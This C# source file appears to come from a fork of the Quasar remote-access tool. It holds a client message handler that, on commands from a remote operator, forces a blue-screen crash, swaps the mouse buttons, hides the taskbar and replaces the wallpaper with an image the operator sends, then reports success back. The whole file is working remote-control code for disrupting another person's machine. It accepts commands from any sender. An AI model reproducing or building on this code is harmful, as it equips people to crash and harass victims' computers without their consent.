using Quasar.Common.Messages;
using Quasar.Common.Networking;
using Quasar.Common.Messages.FunStuff;
using Quasar.Common.Messages.other;
using Quasar.Client.FunStuff;
using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Runtime.InteropServices;

namespace Quasar.Client.Messages
{
    public class FunStuffHandler : IMessageProcessor
    {
        private BSOD _bsod = new BSOD();
        private SwapMouseButtons _swapMouseButtons = new SwapMouseButtons();
        private HideTaskbar _hideTaskbar = new HideTaskbar();

        public bool CanExecute(IMessage message) => message is DoBSOD || message is DoSwapMouseButtons || message is DoHideTaskbar || message is DoChangeWallpaper;

        public bool CanExecuteFrom(ISender sender) => true;

        public void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case DoBSOD msg:
                    Execute(sender, msg);
                    break;
                case DoSwapMouseButtons msg:
                    Execute(sender, msg);
                    break;
                case DoHideTaskbar msg:
                    Execute(sender, msg);
                    break;
                case DoChangeWallpaper msg:
                    Execute(sender, msg);
                    break;
            }
        }

        private void Execute(ISender client, DoBSOD message)
        {
            client.Send(new SetStatus { Message = "Successfull BSOD" });

            _bsod.DOBSOD();
        }

        private void Execute(ISender client, DoSwapMouseButtons message)
        {
            try
            {
                SwapMouseButtons.SwapMouse();
                client.Send(new SetStatus { Message = "Successfull Mouse Swap" });
            }
            catch
            {
                client.Send(new SetStatus { Message = "Failed to swap mouse buttons" });
            }
        }

        private void Execute(ISender client, DoHideTaskbar message)
        {
            try
            {
                client.Send(new SetStatus { Message = "Successfull Hide Taskbar" });
                HideTaskbar.DoHideTaskbar();
            }
            catch
            {
                client.Send(new SetStatus { Message = "Failed to hide taskbar" });
            }
        }

        private void Execute(ISender client, DoChangeWallpaper message)
        {
            try
            {
                string imagePath = SaveImageToFile(message.ImageData, message.ImageFormat);
                Quasar.Client.FunStuff.ChangeWallpaper.SetWallpaper(imagePath);
                client.Send(new SetStatus { Message = "Successfull Wallpaper Change" });
            }
            catch
            {
                client.Send(new SetStatus { Message = "Failed to change wallpaper" });
            }
        }

        private string SaveImageToFile(byte[] imageData, string imageFormat)
        {
            string tempPath = Path.Combine(Path.GetTempPath(), "wallpaper" + GetImageExtension(imageFormat));
            using (MemoryStream ms = new MemoryStream(imageData))
            {
                Image image = Image.FromStream(ms);
                image.Save(tempPath, GetImageFormat(imageFormat));
            }
            return tempPath;
        }

        private string GetImageExtension(string imageFormat)
        {
            switch (imageFormat.ToLower())
            {
                case "jpeg":
                case "jpg":
                    return ".jpg";
                case "png":
                    return ".png";
                case "bmp":
                    return ".bmp";
                case "gif":
                    return ".gif";
                default:
                    return ".img";
            }
        }

        private ImageFormat GetImageFormat(string imageFormat)
        {
            switch (imageFormat.ToLower())
            {
                case "jpeg":
                case "jpg":
                    return ImageFormat.Jpeg;
                case "png":
                    return ImageFormat.Png;
                case "bmp":
                    return ImageFormat.Bmp;
                case "gif":
                    return ImageFormat.Gif;
                default:
                    throw new NotSupportedException($"Image format {imageFormat} is not supported.");
            }
        }

    }
}
